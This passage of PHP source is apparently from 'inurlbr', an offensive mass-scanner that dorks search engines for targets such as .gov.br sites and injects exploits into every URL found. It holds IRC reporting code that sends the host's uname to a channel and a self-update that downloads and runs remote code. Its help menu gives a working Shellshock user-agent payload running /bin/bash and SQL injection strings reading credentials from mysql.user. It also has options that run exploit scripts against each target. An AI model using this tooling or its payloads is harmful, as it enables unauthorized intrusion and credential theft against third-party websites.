    $_ = array(0 => rand(0, 10000), 1 => $alph[rand(0, count($alph))]);
    $_SESSION['config']['irc']['my_pid'] = 0;
    $_SESSION['config']['irc']['irc_server'] = $_SESSION['config']['irc']['conf'][0];
    $_SESSION['config']['irc']['irc_channel'] = "#{$_SESSION['config']['irc']['conf'][1]}";
    $_SESSION['config']['irc']['irc_port'] = 6667;
    $_SESSION['config']['irc']['localhost'] = "127.0.0.1 localhost";
    $_SESSION['config']['irc']['irc_nick'] = "[BOT]1nurl{$_[0]}[{$_[1]}]";
    $_SESSION['config']['irc']['irc_realname'] = "B0t_1NURLBR";
    $_SESSION['config']['irc']['irc_quiet'] = "Session Ended";
    global $conf;
} elseif (!is_array($_SESSION['config']['irc']['conf']) && not_isnull_empty($opcoes['irc'])) {

    __getOut(__bannerLogo() . "{$_SESSION["c1"]}[ INFO ]{$_SESSION["c0"]}{$_SESSION["c2"]}IRC WRONG FORMAT! ex: --irc 'irc.rizon.net#inurlbrasil' {$_SESSION["c0"]}\n");
}

################################################################################
#IRC CONECTION##################################################################
################################################################################

function __ircConect($conf) {

    $fp = fsockopen($conf['irc_server'], $conf['irc_port'], $conf['errno'], $conf['errstr'], 30);
    if (!$fp) {

        echo "Error: {$conf['errstr']}({$conf['errno']})\n";
        return NULL;
    }
    $u = php_uname();
    fwrite($fp, "NICK {$conf['irc_nick']}\r\n");
    fwrite($fp, "USER {$conf['irc_nick']} 8 * :{$conf['irc_realname']}\r\n");
    fwrite($fp, "JOIN {$conf['irc_channel']}\r\n");
    fwrite($fp, "PRIVMSG {$conf['irc_channel']} :[ SERVER ] {$u}\r\n");
    return $fp;
}

################################################################################
#IRC SEND MSG###################################################################
################################################################################

function __ircMsg($conf, $msg) {

    fwrite($conf['irc_connection'], "PRIVMSG ${conf['irc_channel']} :${msg}\r\n") . sleep(2);
    __plus();
}

################################################################################
#IRC PING PONG##################################################################
################################################################################

function __ircPong($conf) {

    while (!feof($conf['irc_connection'])) {

        $conf['READ_BUFFER'] = fgets($conf['irc_connection']);
        __plus();
        if (preg_match("/^PING(.+)/", $conf['READ_BUFFER'], $conf['ret'])) {

            __debug(array('debug' => "[ PING-PONG ]{$conf['ret'][1]}", 'function' => '__ircPong'), 6) . __plus();
            fwrite($conf['READ_BUFFER'], "PONG {$conf['ret'][1]}\r\n");
            ($_SESSION['config']['debug'] == 6) ?
                            fwrite($conf['irc_connection'], "PRIVMSG ${conf['irc_channel']} :[ PING-PONG ]-> {$conf['ret'][1]}->function:__ircPong\r\n") : NULL;
        }
    }
}

################################################################################
#IRC QUIT#######################################################################
################################################################################

function __ircQuit($conf) {

    fwrite($conf['irc_connection'], "QUIT {$conf['irc_quiet']}\r\n") . sleep(2);
    __plus();
    fclose($conf['irc_connection']);
}

#END IRC########################################################################
#UPDATE SCRIPT##################################################################
################################################################################

function __update() {

    echo __bannerLogo();

    echo "{$_SESSION["c1"]}__[ ! ] {$_SESSION["c16"]}WANT TO MAKE UPDATE SCRIPT\n{$_SESSION["c0"]}";
    echo "{$_SESSION["c1"]}__[ ! ] {$_SESSION["c16"]}This can modify the current script\n{$_SESSION["c0"]}";
    echo "{$_SESSION["c1"]}__[ ! ] {$_SESSION["c16"]}ARE YOU SURE ? (y \ n): {$_SESSION["c0"]}";

    if (trim(fgets(STDIN)) == 'y') {

        $resultado = __request_info("https://raw.githubusercontent.com/googleinurl/SCANNER-INURLBR/master/inurlbr.php", $_SESSION["config"]["proxy"], NULL);

        if (not_isnull_empty($resultado['corpo'])) {

            unlink('inurlbr.php');
            $varf = fopen('inurlbr.php', 'a');
            fwrite($varf, $resultado['corpo']);
            fclose($varf);
            chmod('inurlbr.php', 0777);
            echo "\nUPDATE DONE WITH SUCCESS!\n";
            sleep(3);
            system("chmod +x inurlbr.php | php inurlbr.php");
            exit();
        } else {

            echo __bannerLogo();
            echo "{$_SESSION["c1"]}__[ x ] {$_SESSION["c16"]}FAILURE TO SERVER!\n{$_SESSION["c0"]}";
        }
    }
}

################################################################################
#SECURITIES VALIDATION DOUBLE#####################################################
################################################################################

function not_isnull_empty($valor = NULL) {

    RETURN !is_null($valor) && !empty($valor) ? TRUE : FALSE;
}

################################################################################
#MENU###########################################################################
################################################################################

function __menu() {

    return __getOut(__extra() . "        
 {$_SESSION["c1"]}_    _ ______ _      _____  
| |  | |  ____| |    |  __ \
| |__| | |__  | |    | |__) |
|  __  |  __| | |    |  ___/
| |  | | |____| |____| |    
|_|  |_|______|______|_|

{$_SESSION["c1"]}[!]{$_SESSION["c0"]}Current PHP version=>[ {$_SESSION["c1"]}" . phpversion() . "{$_SESSION["c0"]} ]
{$_SESSION["c1"]}[!]{$_SESSION["c0"]}Current script owner=>[ {$_SESSION["c1"]}" . get_current_user() . "{$_SESSION["c0"]} ]
{$_SESSION["c1"]}[!]{$_SESSION["c0"]}Current uname=>[ {$_SESSION["c1"]}" . php_uname() . "{$_SESSION["c0"]} ]
{$_SESSION["c1"]}[!]{$_SESSION["c0"]}Current pwd =>[ {$_SESSION["c1"]}" . getcwd() . "{$_SESSION["c0"]} ]
" . $_SESSION['config']['line'] . "
    
{$_SESSION["c1"]}-h{$_SESSION["c0"]}
{$_SESSION["c1"]}--help{$_SESSION["c0"]}   Alternative long length help command.
{$_SESSION["c1"]}--ajuda{$_SESSION["c0"]}  Command to specify Help.
{$_SESSION["c1"]}--info{$_SESSION["c0"]}   Information script.
{$_SESSION["c1"]}--update{$_SESSION["c0"]} Code update.    
{$_SESSION["c1"]}-q{$_SESSION["c0"]}       Choose which search engine you want through [{$_SESSION["c2"]}1...24{$_SESSION["c0"]}] / [{$_SESSION["c2"]}e1..6{$_SESSION["c0"]}]]:
     [options]:
     {$_SESSION["c1"]}1{$_SESSION["c0"]}   - {$_SESSION["c2"]}GOOGLE / (CSE) GENERIC RANDOM / API
     {$_SESSION["c1"]}2{$_SESSION["c0"]}   - {$_SESSION["c2"]}BING
     {$_SESSION["c1"]}3{$_SESSION["c0"]}   - {$_SESSION["c2"]}YAHOO BR
     {$_SESSION["c1"]}4{$_SESSION["c0"]}   - {$_SESSION["c2"]}ASK
     {$_SESSION["c1"]}5{$_SESSION["c0"]}   - {$_SESSION["c2"]}HAO123 BR
     {$_SESSION["c1"]}6{$_SESSION["c0"]}   - {$_SESSION["c2"]}GOOGLE (API)
     {$_SESSION["c1"]}7{$_SESSION["c0"]}   - {$_SESSION["c2"]}LYCOS
     {$_SESSION["c1"]}8{$_SESSION["c0"]}   - {$_SESSION["c2"]}UOL BR
     {$_SESSION["c1"]}9{$_SESSION["c0"]}   - {$_SESSION["c2"]}YAHOO US
     {$_SESSION["c1"]}10{$_SESSION["c0"]}  - {$_SESSION["c2"]}SAPO
     {$_SESSION["c1"]}11{$_SESSION["c0"]}  - {$_SESSION["c2"]}DMOZ
     {$_SESSION["c1"]}12{$_SESSION["c0"]}  - {$_SESSION["c2"]}GIGABLAST
     {$_SESSION["c1"]}13{$_SESSION["c0"]}  - {$_SESSION["c2"]}NEVER
     {$_SESSION["c1"]}14{$_SESSION["c0"]}  - {$_SESSION["c2"]}BAIDU BR
     {$_SESSION["c1"]}15{$_SESSION["c0"]}  - {$_SESSION["c2"]}YANDEX
     {$_SESSION["c1"]}16{$_SESSION["c0"]}  - {$_SESSION["c2"]}ZOO
     {$_SESSION["c1"]}17{$_SESSION["c0"]}  - {$_SESSION["c2"]}HOTBOT
     {$_SESSION["c1"]}18{$_SESSION["c0"]}  - {$_SESSION["c2"]}ZHONGSOU
     {$_SESSION["c1"]}19{$_SESSION["c0"]}  - {$_SESSION["c2"]}HKSEARCH
     {$_SESSION["c1"]}20{$_SESSION["c0"]}  - {$_SESSION["c2"]}EZILION
     {$_SESSION["c1"]}21{$_SESSION["c0"]}  - {$_SESSION["c2"]}SOGOU
     {$_SESSION["c1"]}22{$_SESSION["c0"]}  - {$_SESSION["c2"]}DUCK DUCK GO
     {$_SESSION["c1"]}23{$_SESSION["c0"]}  - {$_SESSION["c2"]}BOOROW
     {$_SESSION["c1"]}24{$_SESSION["c0"]}  - {$_SESSION["c2"]}GOOGLE(CSE) GENERIC RANDOM
     ----------------------------------------
                 SPECIAL MOTORS
     ----------------------------------------
     {$_SESSION["c1"]}e1{$_SESSION["c0"]}  - {$_SESSION["c2"]}TOR FIND
     {$_SESSION["c1"]}e2{$_SESSION["c0"]}  - {$_SESSION["c2"]}ELEPHANT
     {$_SESSION["c1"]}e3{$_SESSION["c0"]}  - {$_SESSION["c2"]}TORSEARCH
     {$_SESSION["c1"]}e4{$_SESSION["c0"]}  - {$_SESSION["c2"]}WIKILEAKS
     {$_SESSION["c1"]}e5{$_SESSION["c0"]}  - {$_SESSION["c2"]}OTN
     {$_SESSION["c1"]}e6{$_SESSION["c0"]}  - {$_SESSION["c2"]}EXPLOITS SHODAN
     ----------------------------------------
     {$_SESSION["c1"]}all{$_SESSION["c0"]} - {$_SESSION["c2"]}All search engines / not special motors{$_SESSION["c0"]}
     Default:    {$_SESSION["c1"]}1{$_SESSION["c0"]}
     Example: {$_SESSION["c1"]}-q{$_SESSION["c0"]} {$_SESSION["c2"]}{op}{$_SESSION["c0"]}
     Usage:   {$_SESSION["c1"]}-q{$_SESSION["c0"]} {$_SESSION["c2"]}1{$_SESSION["c0"]}
              {$_SESSION["c1"]}-q{$_SESSION["c0"]} {$_SESSION["c2"]}5{$_SESSION["c0"]}
               Using more than one engine:  {$_SESSION["c1"]}-q{$_SESSION["c0"]} {$_SESSION["c2"]}1,2,5,6,11,24{$_SESSION["c0"]}
               Using all engines:      {$_SESSION["c1"]}-q{$_SESSION["c0"]} {$_SESSION["c2"]}all{$_SESSION["c0"]}
     
 {$_SESSION["c1"]}--proxy{$_SESSION["c0"]} Choose which proxy you want to use through the search engine:
     Example: {$_SESSION["c1"]}--proxy {$_SESSION["c2"]}{proxy:port}{$_SESSION["c0"]}
     Usage:   {$_SESSION["c1"]}--proxy {$_SESSION["c2"]}localhost:8118{$_SESSION["c0"]}
              {$_SESSION["c1"]}--proxy {$_SESSION["c2"]}socks5://googleinurl@localhost:9050{$_SESSION["c0"]}
              {$_SESSION["c1"]}--proxy {$_SESSION["c2"]}http://admin:12334@172.16.0.90:8080{$_SESSION["c0"]}
   
 {$_SESSION["c1"]}--proxy-file{$_SESSION["c0"]} Set font file to randomize your proxy to each search engine.
     Example: {$_SESSION["c1"]}--proxy-file {$_SESSION["c2"]}{proxys}{$_SESSION["c0"]}
     Usage:   {$_SESSION["c1"]}--proxy-file {$_SESSION["c2"]}proxys_list.txt{$_SESSION["c0"]}

 {$_SESSION["c1"]}--time-proxy{$_SESSION["c0"]} Set the time how often the proxy will be exchanged.
     Example: {$_SESSION["c1"]}--time-proxy {$_SESSION["c2"]}{second}{$_SESSION["c0"]}
     Usage:   {$_SESSION["c1"]}--time-proxy {$_SESSION["c2"]}10{$_SESSION["c0"]}

 {$_SESSION["c1"]}--proxy-http-file{$_SESSION["c0"]} Set file with urls http proxy, 
     are used to bular capch search engines
     Example: {$_SESSION["c1"]}--proxy-http-file {$_SESSION["c2"]}{youfilehttp}{$_SESSION["c0"]}
     Usage:   {$_SESSION["c1"]}--proxy-http-file {$_SESSION["c2"]}http_proxys.txt{$_SESSION["c0"]}
         

 {$_SESSION["c1"]}--tor-random{$_SESSION["c0"]} Enables the TOR function, each usage links an unique IP.
 
 {$_SESSION["c1"]}-t{$_SESSION["c0"]}  Choose the validation type: op {$_SESSION["c2"]}1, 2, 3, 4, 5{$_SESSION["c0"]}
     [options]:
     {$_SESSION["c2"]}1{$_SESSION["c0"]}   - The first type uses default errors considering the script:
     It establishes connection with the exploit through the get method.
     Demo: www.alvo.com.br/pasta/index.php?id={$_SESSION["c3"]}{exploit}{$_SESSION["c0"]}
   
     {$_SESSION["c2"]}2{$_SESSION["c0"]}   -  The second type tries to valid the error defined by: {$_SESSION["c1"]}-a={$_SESSION["c2"]}'VALUE_INSIDE_THE _TARGET'{$_SESSION["c0"]}
     It also establishes connection with the exploit through the get method
     Demo: www.alvo.com.br/pasta/index.php?id={$_SESSION["c3"]}{exploit}{$_SESSION["c0"]}
   
     {$_SESSION["c2"]}3{$_SESSION["c0"]}   - The third type combine both first and second types:
     Then, of course, it also establishes connection with the exploit through the get method
     Demo: www.target.com.br{$_SESSION["c3"]}{exploit}{$_SESSION["c0"]}
     Default:    {$_SESSION["c2"]}1{$_SESSION["c0"]}
     Example: {$_SESSION["c1"]}-t {$_SESSION["c2"]}{op}{$_SESSION["c0"]}
     Usage:   {$_SESSION["c1"]}-t {$_SESSION["c2"]}1{$_SESSION["c0"]}
     
     {$_SESSION["c2"]}4{$_SESSION["c0"]}   - The fourth type a validation based on source file and will be enabled scanner standard functions.
     The source file their values are concatenated with target url.
     - Set your target with command {$_SESSION["c1"]}--target {$_SESSION["c2"]}{http://target}{$_SESSION["c0"]}
     - Set your file with command {$_SESSION["c1"]}-o {$_SESSION["c2"]}{file}{$_SESSION["c0"]}
     Explicative:
     Source file values:
     /admin/index.php?id=
     /pag/index.php?id=
     /brazil.php?new=
     Demo: 
     www.target.com.br/admin/index.php?id={$_SESSION["c3"]}{exploit}{$_SESSION["c0"]}
     www.target.com.br/pag/index.php?id={$_SESSION["c3"]}{exploit}{$_SESSION["c0"]}
     www.target.com.br/brazil.php?new={$_SESSION["c3"]}{exploit}{$_SESSION["c0"]}
     
     {$_SESSION["c2"]}5{$_SESSION["c0"]}   - (FIND PAGE) The fifth type of validation based on the source file,
     Will be enabled only one validation code 200 on the target server, or if the url submit such code will be considered vulnerable.
     - Set your target with command {$_SESSION["c1"]}--target {$_SESSION["c2"]}{http://target}{$_SESSION["c0"]}
     - Set your file with command {$_SESSION["c1"]}-o {$_SESSION["c2"]}{file}{$_SESSION["c0"]}
     Explicative:
     Source file values:
     /admin/admin.php
     /admin.asp
     /admin.aspx
     Demo: 
     www.target.com.br/admin/admin.php
     www.target.com.br/admin.asp
     www.target.com.br/admin.aspx
     Observation: If it shows the code 200 will be separated in the output file

     DEFAULT ERRORS:  
     {$_SESSION["c11"]}
     [*]JAVA INFINITYDB, [*]LOCAL FILE INCLUSION, [*]ZIMBRA MAIL,           [*]ZEND FRAMEWORK, 
     [*]ERROR MARIADB,   [*]ERROR MYSQL,          [*]ERROR JBOSSWEB,        [*]ERROR MICROSOFT,
     [*]ERROR ODBC,      [*]ERROR POSTGRESQL,     [*]ERROR JAVA INFINITYDB, [*]ERROR PHP,
     [*]CMS WORDPRESS,   [*]SHELL WEB,            [*]ERROR JDBC,            [*]ERROR ASP,
     [*]ERROR ORACLE,    [*]ERROR DB2,            [*]JDBC CFM,              [*]ERROS LUA, 
     [*]ERROR INDEFINITE
     {$_SESSION["c0"]}
         
 {$_SESSION["c1"]}--dork{$_SESSION["c0"]} Defines which dork the search engine will use.
     Example: {$_SESSION["c1"]}--dork {$_SESSION["c2"]}{dork}{$_SESSION["c0"]}
     Usage:   {$_SESSION["c1"]}--dork {$_SESSION["c2"]}'site:.gov.br inurl:php? id'{$_SESSION["c0"]}
     - Using multiples dorks:
     Example: {$_SESSION["c1"]}--dork {$_SESSION["c2"]}{[DORK]dork1[DORK]dork2[DORK]dork3}{$_SESSION["c0"]}
     Usage:   {$_SESSION["c1"]}--dork {$_SESSION["c2"]}'[DORK]site:br[DORK]site:ar inurl:php[DORK]site:il inurl:asp'{$_SESSION["c0"]}
 
 {$_SESSION["c1"]}--dork-file{$_SESSION["c0"]} Set font file with your search dorks.
     Example: {$_SESSION["c1"]}--dork-file {$_SESSION["c2"]}{dork_file}{$_SESSION["c0"]}
     Usage:   {$_SESSION["c1"]}--dork-file {$_SESSION["c2"]}'dorks.txt'{$_SESSION["c0"]}

 {$_SESSION["c1"]}--exploit-get{$_SESSION["c0"]} Defines which exploit will be injected through the GET method to each URL found.
     Example: {$_SESSION["c1"]}--exploit-get {$_SESSION["c3"]}{exploit_get}{$_SESSION["c0"]}
     Usage:   {$_SESSION["c1"]}--exploit-get {$_SESSION["c3"]}\"?'´%270x27;\"{$_SESSION["c0"]}
     
 {$_SESSION["c1"]}--exploit-post{$_SESSION["c0"]} Defines which exploit will be injected through the POST method to each URL found.
     Example: {$_SESSION["c1"]}--exploit-post {$_SESSION["c3"]}{exploit_post}{$_SESSION["c0"]}
     Usage:   {$_SESSION["c1"]}--exploit-post {$_SESSION["c3"]}'field1=valor1&field2=valor2&field3=?´0x273exploit;&botao=ok'{$_SESSION["c0"]}
     
 {$_SESSION["c1"]}--exploit-command{$_SESSION["c0"]} Defines which exploit/parameter will be executed in the options: {$_SESSION["c1"]}--command-vul/{$_SESSION["c0"]} {$_SESSION["c1"]}--command-all{$_SESSION["c0"]}.   
     The exploit-command will be identified by the paramaters: {$_SESSION["c1"]}--command-vul/{$_SESSION["c0"]} {$_SESSION["c1"]}--command-all as {$_SESSION["c6"]}_EXPLOIT_{$_SESSION["c0"]}      
     Ex {$_SESSION["c1"]}--exploit-command {$_SESSION["c2"]}'/admin/config.conf' {$_SESSION["c1"]}--command-all {$_SESSION["c2"]}'curl -v {$_SESSION["c8"]}_TARGET_{$_SESSION["c6"]}_EXPLOIT_{$_SESSION["c2"]}'{$_SESSION["c0"]}
     _TARGET_ is the specified URL/TARGET obtained by the process
     _EXPLOIT_ is the exploit/parameter defined by the option {$_SESSION["c1"]}--exploit-command{$_SESSION["c0"]}.
     Example: {$_SESSION["c1"]}--exploit-command {$_SESSION["c2"]}{exploit-command}{$_SESSION["c0"]}
     Usage:   {$_SESSION["c1"]}--exploit-command {$_SESSION["c2"]}'/admin/config.conf'{$_SESSION["c0"]}  
     
 {$_SESSION["c1"]}-a{$_SESSION["c0"]}  Specify the string that will be used on the search script:
     Example: {$_SESSION["c1"]}-a {$_SESSION["c2"]}{string}{$_SESSION["c0"]}
     Usage:   {$_SESSION["c1"]}-a {$_SESSION["c2"]}'<title>hello world</title>'{$_SESSION["c0"]}
     
 {$_SESSION["c1"]}-d{$_SESSION["c0"]}  Specify the script usage op {$_SESSION["c2"]}1, 2, 3, 4, 5.{$_SESSION["c0"]}
     Example: {$_SESSION["c1"]}-d {$_SESSION["c2"]}{op}{$_SESSION["c0"]}
     Usage:   {$_SESSION["c1"]}-d {$_SESSION["c2"]}1 {$_SESSION["c0"]}/URL of the search engine.
              {$_SESSION["c1"]}-d {$_SESSION["c2"]}2 {$_SESSION["c0"]}/Show all the url.
              {$_SESSION["c1"]}-d {$_SESSION["c2"]}3 {$_SESSION["c0"]}/Detailed request of every URL.
              {$_SESSION["c1"]}-d {$_SESSION["c2"]}4 {$_SESSION["c0"]}/Shows the HTML of every URL.
              {$_SESSION["c1"]}-d {$_SESSION["c2"]}5 {$_SESSION["c0"]}/Detailed request of all URLs.
              {$_SESSION["c1"]}-d {$_SESSION["c2"]}6 {$_SESSION["c0"]}/Detailed PING - PONG irc.    
             
 {$_SESSION["c1"]}-s{$_SESSION["c0"]}  Specify the output file where it will be saved the vulnerable URLs.
     
     Example: {$_SESSION["c1"]}-s {$_SESSION["c2"]}{file}{$_SESSION["c0"]}
     Usage:   {$_SESSION["c1"]}-s {$_SESSION["c2"]}your_file.txt
     
 {$_SESSION["c1"]}-o{$_SESSION["c0"]}  Manually manage the vulnerable URLs you want to use from a file, without using a search engine.
     Example: {$_SESSION["c1"]}-o {$_SESSION["c2"]}{file_where_my_urls_are}{$_SESSION["c0"]}
     Usage:   {$_SESSION["c1"]}-o {$_SESSION["c2"]}tests.txt
   
 {$_SESSION["c1"]}--persist{$_SESSION["c0"]}  Attempts when Google blocks your search.
     The script tries to another google host / default = 4
     Example: {$_SESSION["c1"]}--persist {$_SESSION["c2"]}{number_attempts}{$_SESSION["c0"]}
     Usage:   {$_SESSION["c1"]}--persist {$_SESSION["c2"]}7

 {$_SESSION["c1"]}--ifredirect{$_SESSION["c0"]}  Return validation method post REDIRECT_URL
     Example: {$_SESSION["c1"]}--ifredirect {$_SESSION["c2"]}{string_validation}{$_SESSION["c0"]}
     Usage:   {$_SESSION["c1"]}--ifredirect {$_SESSION["c2"]}'/admin/painel.php'

 {$_SESSION["c1"]}-m{$_SESSION["c0"]}  Enable the search for emails on the urls specified.
  
 {$_SESSION["c1"]}-u{$_SESSION["c0"]}  Enables the search for URL lists on the url specified.
 
 {$_SESSION["c1"]}--gc{$_SESSION["c0"]} Enable validation of values ​​with google webcache.
     
 {$_SESSION["c1"]}--pr{$_SESSION["c0"]}  Progressive scan, used to set operators (dorks), 
     makes the search of a dork and valid results, then goes a dork at a time.
  
 {$_SESSION["c1"]}--file-cookie{$_SESSION["c0"]} Open cookie file.
     
 {$_SESSION["c1"]}--save-as{$_SESSION["c0"]} Save results in a certain place.

 {$_SESSION["c1"]}--shellshock{$_SESSION["c0"]} Explore shellshock vulnerability by setting a malicious user-agent.
 
 {$_SESSION["c1"]}--popup{$_SESSION["c0"]} Run --command all or vuln in a parallel terminal.

 {$_SESSION["c1"]}--cms-check{$_SESSION["c0"]} Enable simple check if the url / target is using CMS.

 {$_SESSION["c1"]}--no-banner{$_SESSION["c0"]} Remove the script presentation banner.
     
 {$_SESSION["c1"]}--unique{$_SESSION["c0"]} Filter results in unique domains.

 {$_SESSION["c1"]}--beep{$_SESSION["c0"]} Beep sound when a vulnerability is found.
     
 {$_SESSION["c1"]}--alexa-rank{$_SESSION["c0"]} Show alexa positioning in the results.
     
 {$_SESSION["c1"]}--robots{$_SESSION["c0"]} Show values file robots.
      
 {$_SESSION["c1"]}--range{$_SESSION["c0"]} Set range IP.
      Example: {$_SESSION["c1"]}--range {$_SESSION["c2"]}{range_start,rage_end}{$_SESSION["c0"]}
      Usage:   {$_SESSION["c1"]}--range {$_SESSION["c2"]}'172.16.0.5#172.16.0.255'

 {$_SESSION["c1"]}--range-rand{$_SESSION["c0"]} Set amount of random ips.
      Example: {$_SESSION["c1"]}--range-rand {$_SESSION["c2"]}{rand}{$_SESSION["c0"]}
      Usage:   {$_SESSION["c1"]}--range-rand {$_SESSION["c2"]}'50'

 {$_SESSION["c1"]}--irc{$_SESSION["c0"]} Sending vulnerable to IRC / server channel.
      Example: {$_SESSION["c1"]}--irc {$_SESSION["c2"]}{server#channel}{$_SESSION["c0"]}
      Usage:   {$_SESSION["c1"]}--irc {$_SESSION["c2"]}'irc.rizon.net#inurlbrasil'

 {$_SESSION["c1"]}--http-header{$_SESSION["c0"]} Set HTTP header.
      Example: {$_SESSION["c1"]}--http-header {$_SESSION["c2"]}{youemail}{$_SESSION["c0"]}
      Usage:   {$_SESSION["c1"]}--http-header {$_SESSION["c2"]}'HTTP/1.1 401 Unauthorized,WWW-Authenticate: Basic realm=\"Top Secret\"'
          
 {$_SESSION["c1"]}--sedmail{$_SESSION["c0"]} Sending vulnerable to email.
      Example: {$_SESSION["c1"]}--sedmail {$_SESSION["c2"]}{youemail}{$_SESSION["c0"]}
      Usage:   {$_SESSION["c1"]}--sedmail {$_SESSION["c2"]}youemail@inurl.com.br
          
 {$_SESSION["c1"]}--delay{$_SESSION["c0"]} Delay between research processes.
      Example: {$_SESSION["c1"]}--delay {$_SESSION["c2"]}{second}{$_SESSION["c0"]}
      Usage:   {$_SESSION["c1"]}--delay {$_SESSION["c2"]}10
  
 {$_SESSION["c1"]}--time-out{$_SESSION["c0"]} Timeout to exit the process.
      Example: {$_SESSION["c1"]}--time-out {$_SESSION["c2"]}{second}{$_SESSION["c0"]}
      Usage:   {$_SESSION["c1"]}--time-out {$_SESSION["c2"]}10

 {$_SESSION["c1"]}--ifurl{$_SESSION["c0"]} Filter URLs based on their argument.
      Example: {$_SESSION["c1"]}--ifurl {$_SESSION["c2"]}{ifurl}{$_SESSION["c0"]}
      Usage:   {$_SESSION["c1"]}--ifurl {$_SESSION["c2"]}index.php?id=

 {$_SESSION["c1"]}--ifcode{$_SESSION["c0"]} Valid results based on your return http code.
      Example: {$_SESSION["c1"]}--ifcode {$_SESSION["c2"]}{ifcode}{$_SESSION["c0"]}
      Usage:   {$_SESSION["c1"]}--ifcode {$_SESSION["c2"]}200
 
 {$_SESSION["c1"]}--ifemail{$_SESSION["c0"]} Filter E-mails based on their argument.
     Example: {$_SESSION["c1"]}--ifemail {$_SESSION["c2"]}{file_where_my_emails_are}{$_SESSION["c0"]}
     Usage:   {$_SESSION["c1"]}--ifemail {$_SESSION["c2"]}sp.gov.br

 {$_SESSION["c1"]}--url-reference{$_SESSION["c0"]} Define referring URL in the request to send him against the target.
      Example: {$_SESSION["c1"]}--url-reference {$_SESSION["c2"]}{url}{$_SESSION["c0"]}
      Usage:   {$_SESSION["c1"]}--url-reference {$_SESSION["c2"]}http://target.com/admin/user/valid.php
 
 {$_SESSION["c1"]}--mp{$_SESSION["c0"]} Limits the number of pages in the search engines.
     Example: {$_SESSION["c1"]}--mp {$_SESSION["c2"]}{limit}{$_SESSION["c0"]}
     Usage:   {$_SESSION["c1"]}--mp {$_SESSION["c2"]}50
     
 {$_SESSION["c1"]}--user-agent{$_SESSION["c0"]} Define the user agent used in its request against the target.
      Example: {$_SESSION["c1"]}--user-agent {$_SESSION["c2"]}{agent}{$_SESSION["c0"]}
      Usage:   {$_SESSION["c1"]}--user-agent {$_SESSION["c2"]}'Mozilla/5.0 (X11; U; Linux i686) Gecko/20071127 Firefox/2.0.0.11'
      Usage-exploit / SHELLSHOCK:   
      {$_SESSION["c1"]}--user-agent {$_SESSION["c2"]}'() { foo;};echo; /bin/bash -c \"expr 299663299665 / 3; echo CMD:;id; echo END_CMD:;\"'
      Complete command:    
      php inurlbr.php --dork '_YOU_DORK_' -s shellshock.txt --user-agent '_YOU_AGENT_XPL_SHELLSHOCK' -t 2 -a '99887766555'
 
 {$_SESSION["c1"]}--sall{$_SESSION["c0"]} Saves all urls found by the scanner.
     Example: {$_SESSION["c1"]}--sall {$_SESSION["c2"]}{file}{$_SESSION["c0"]}
     Usage:   {$_SESSION["c1"]}--sall {$_SESSION["c2"]}your_file.txt

 {$_SESSION["c1"]}--command-vul{$_SESSION["c0"]} Every vulnerable URL found will execute this command parameters.
     Example: {$_SESSION["c1"]}--command-vul {$_SESSION["c2"]}{command}{$_SESSION["c0"]}
     Usage:   {$_SESSION["c1"]}--command-vul {$_SESSION["c2"]}'nmap sV -p 22,80,21 {$_SESSION["c8"]}_TARGET_{$_SESSION["c0"]}{$_SESSION["c2"]}'{$_SESSION["c0"]}
              {$_SESSION["c1"]}--command-vul {$_SESSION["c2"]}'./exploit.sh {$_SESSION["c8"]}_TARGET_{$_SESSION["c0"]} {$_SESSION["c2"]}output.txt'{$_SESSION["c0"]}
              {$_SESSION["c1"]}--command-vul {$_SESSION["c2"]}'php miniexploit.php -t {$_SESSION["c8"]}_TARGET_{$_SESSION["c2"]} -s output.txt'{$_SESSION["c0"]}
                  
 {$_SESSION["c1"]}--command-all{$_SESSION["c0"]} Use this commmand to specify a single command to EVERY URL found.
     Example: {$_SESSION["c1"]}--command-all {$_SESSION["c2"]}{command}{$_SESSION["c0"]}
     Usage:   {$_SESSION["c1"]}--command-all {$_SESSION["c2"]}'nmap sV -p 22,80,21 {$_SESSION["c8"]}_TARGET_{$_SESSION["c0"]}{$_SESSION["c2"]}'{$_SESSION["c0"]}
              {$_SESSION["c1"]}--command-all {$_SESSION["c2"]}'./exploit.sh {$_SESSION["c8"]}_TARGET_{$_SESSION["c0"]} {$_SESSION["c2"]}output.txt'{$_SESSION["c0"]}
              {$_SESSION["c1"]}--command-all {$_SESSION["c2"]}'php miniexploit.php -t {$_SESSION["c8"]}_TARGET_{$_SESSION["c2"]} -s output.txt'{$_SESSION["c0"]}
    [!] Observation:
   
    {$_SESSION["c8"]}_TARGET_{$_SESSION["c0"]} will be replaced by the URL/target found, although if the user  
    doesn't input the get, only the domain will be executed.
   
    {$_SESSION["c14"]}_TARGETFULL_{$_SESSION["c0"]} will be replaced by the original URL / target found.
       
    {$_SESSION["c14"]}_TARGETXPL_{$_SESSION["c0"]} will be replaced by the original URL / target found + EXPLOIT --exploit-get.
       
    {$_SESSION["c9"]}_TARGETIP_{$_SESSION["c0"]} return of ip URL / target found.
        
    {$_SESSION["c8"]}_URI_{$_SESSION["c0"]} Back URL set of folders / target found.
        
    {$_SESSION["c15"]}_RANDOM_{$_SESSION["c0"]} Random strings.
        
    {$_SESSION["c9"]}_PORT_{$_SESSION["c0"]} Capture port of the current test, within the --port-scan process.
   
    {$_SESSION["c6"]}_EXPLOIT_{$_SESSION["c0"]}  will be replaced by the specified command argument {$_SESSION["c1"]}--exploit-command{$_SESSION["c0"]}.
   The exploit-command will be identified by the parameters {$_SESSION["c1"]}--command-vul/{$_SESSION["c0"]} {$_SESSION["c1"]}--command-all as {$_SESSION["c6"]}_EXPLOIT_{$_SESSION["c0"]}

 {$_SESSION["c1"]}--replace{$_SESSION["c0"]} Replace values ​​in the target URL.
    Example:  {$_SESSION["c1"]}--replace {$_SESSION["c2"]}{value_old[INURL]value_new}{$_SESSION["c0"]}
     Usage:   {$_SESSION["c1"]}--replace {$_SESSION["c2"]}'index.php?id=[INURL]index.php?id=1666+and+(SELECT+user,Password+from+mysql.user+limit+0,1)=1'{$_SESSION["c0"]}
              {$_SESSION["c1"]}--replace {$_SESSION["c2"]}'main.php?id=[INURL]main.php?id=1+and+substring(@@version,1,1)=1'{$_SESSION["c0"]}
              {$_SESSION["c1"]}--replace {$_SESSION["c2"]}'index.aspx?id=[INURL]index.aspx?id=1%27´'{$_SESSION["c0"]}
                  
 {$_SESSION["c1"]}--remove{$_SESSION["c0"]} Remove values ​​in the target URL.
      Example: {$_SESSION["c1"]}--remove {$_SESSION["c2"]}{string}{$_SESSION["c0"]}
      Usage:   {$_SESSION["c1"]}--remove {$_SESSION["c2"]}'/admin.php?id=0'
              
